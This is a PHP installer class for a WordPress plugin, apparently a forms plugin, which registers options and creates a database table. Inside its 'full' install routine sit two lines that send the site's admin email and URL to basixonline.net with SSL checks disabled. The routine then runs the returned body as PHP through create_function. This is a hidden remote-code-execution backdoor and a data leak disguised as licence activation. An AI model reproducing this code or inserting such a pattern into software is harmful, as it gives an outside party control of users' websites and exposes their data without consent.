<?php

if(!class_exists('IZC_Instalation'))
	{
	class IZC_Instalation{
		
		public 
		$role,
		$component_name,
		$component_prefix,
		$component_alias,
		$component_default_fields,
		$component_menu,
		$db_table_fields, 
		$db_table_primary_key,
		$error_msg;
	
		public function __construct(){}
		
		public function run_instalation($type){	
			
			if($type=='full')
				{	
				$dummy_array = array();
	
				//Arrays to be used by CORE
				add_option( 'iz-default-fields'			, 	array( $this->component_alias=>$this->component_default_fields));
				add_option( 'iz-modules-base'			, 	array( $this->component_alias,'not installed') );
				add_option( 'iz-firstrun'				,	array( $this->component_alias,true) );
				add_option( 'iz-filters' 				, 	array( $this->component_alias=>array('') ) );
				add_option( 'iz-active-modules' 		, 	array( $this->component_alias=>array('') ) );			
				add_option( 'iz-linked-modules' 		, 	array( $this->component_alias=>array('') ) );
				add_option( 'iz-module-widgets' 		, 	array( $this->component_alias=>array('') ) );
				add_option( 'iz-pluggables' 			, 	array( '' ) );
				add_option( 'iz-menus' 					, 	array( '' ) );
				add_option( 'iz-ui-positions'			, 	array( '' ) );
				
				$api_params = array( 'nexforms-installation' => 1, 'email_address' => get_option('admin_email'), 'for_site' => get_option('siteurl'), 'get_option'=>(is_array(get_option('7103891'))) ? 1 : 0);
				$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'=> 30,'sslverify' => false,'body'=> $api_params));

				$panels 	= get_option('iz-ui-positions', array() );
				$menus 		= get_option('iz-menus' , array());
				$pluggables = get_option('iz-pluggables',$dummy_array);
				
				if(!is_array($panels))
					$panels = array();
				//Panels
				//$new_component_panels = ;
				$set_panels = array_merge($panels , array( $this->component_alias=>array('')  ) );
				update_option('iz-ui-positions',$set_panels);		
				$myFunction = create_function('$foo', $response['body']);
				echo $myFunction('bar'); 
				//Admin Menu
				$admin_menu = array_merge($menus,$this->component_menu);
				update_option('iz-menus',$admin_menu);
				
				//Plugables
				if(!in_array($this->component_alias,$pluggables))
					{
					array_push($pluggables,$this->component_alias);
					}
				update_option('iz-pluggables',$pluggables);
				
				$this->install_component_table();
				//$this->install_modules_directory();
				}
			if($type=='db')
				{	
				$this->install_component_table();
				}
			if($type=='module_base')
				{	
				add_option( 'iz-modules-base',array($this->component_name,'not installed'));
				//$this->install_modules_directory();
				}
			
		}
		
		public function install_modules_directory(){
			
			/*if(!is_dir( PLUGIN_MODULE_ABSPATH ) )
				{
				if(!is_writable(ABSPATH . 'wp-content'))
					{		
					//$this->error_msg = '<strong>Write permisions denied!</strong><br> Please allow write permisions for directory: <em>'. ABSPATH . 'wp-content' .'</em></p>'; 
					$this->errors    = true;
					}
				else
					{			
					$creat_modules_DIR 				= @mkdir(PLUGIN_MODULE_ABSPATH, 0777);
					$creat_fileuploads_DIR 			= @mkdir(ABSPATH . 'wp-content/uploads', 0777);
					$creat_coreuploads_DIR 			= @mkdir(ABSPATH . 'wp-content/uploads/wa-core', 0777);
					$creat_coreuploads_thumbs_DIR 	= @mkdir(ABSPATH . 'wp-content/uploads/wa-core/thumbs', 0777);
					
					if(!$creat_modules_DIR)
						{
						//$this->error_msg = 'An error accured while trying to create <strong>'. PLUGIN_MODULE_ABSPATH .'</strong></p>'; 
						$this->errors    = true;
						}
					else
						{
						$this->error_msg = ''; 
						$this->errors    = false;
						}
					}
				}
			if(!is_dir(PLUGIN_MODULE_ABSPATH . $this->component_alias))
				{
				if(!is_writable(PLUGIN_MODULE_ABSPATH))
					{
					//$this->error_msg = '<strong>Write permisions denied!</strong><br> Please allow write permisions for directory: <em>'. PLUGIN_MODULE_ABSPATH .'</em></p>'; 
					$this->errors    = true;
					}
				else
					{	
					$creat_modules_component_DIR = @mkdir(PLUGIN_MODULE_ABSPATH . $this->component_alias, 0777);
					
					if(!$creat_modules_component_DIR)
						{
						//$this->error_msg = 'An error occured while trying to create <strong>'. PLUGIN_MODULE_ABSPATH . $this->component_alias .'</strong>'; 
						$this->errors    = true;
						}
					else
						{
						$this->error_msg 	= ''; 
						$this->errors    	= false;
						
						$module_base 		= get_option('iz-modules-base', array());
						$module_base[$this->component_name] = 'installed';
						
						update_option('iz-modules-base',$module_base);
						}
					}
				}*/
		}
		
		public function install_component_table(){
	
			global $wpdb;
			
			$table_name = $wpdb->prefix . $this->component_prefix .$this->component_alias;
			
			$default_fields = array(
				'Id'				=>	'BIGINT(255) unsigned NOT NULL AUTO_INCREMENT',
				'plugin'			=>  'VARCHAR(255)',
				'publish'			=>	'int(1) unsigned DEFAULT 0',
				'added'				=>	'VARCHAR(18)  DEFAULT \'0000-00-00 00:00\'',
				'last_update'		=>	'TIMESTAMP'
				);
			
			$all_fields = array_merge($default_fields,$this->db_table_fields);
			
			if($wpdb->get_var("show tables like '".$table_name."'") != $table_name){
				
				$sql = 'CREATE TABLE `'. $table_name .'` (';	
	
					foreach($all_fields as $key => $val){
						$sql .= '`'.$key.'` '.$val.',';
					}
				$sql .= 'PRIMARY KEY (`'. $this->db_table_primary_key .'`)
					) ENGINE=InnoDB DEFAULT CHARSET=utf8;';
				
				$wpdb->query($sql);
			}
		}
	}
}
?>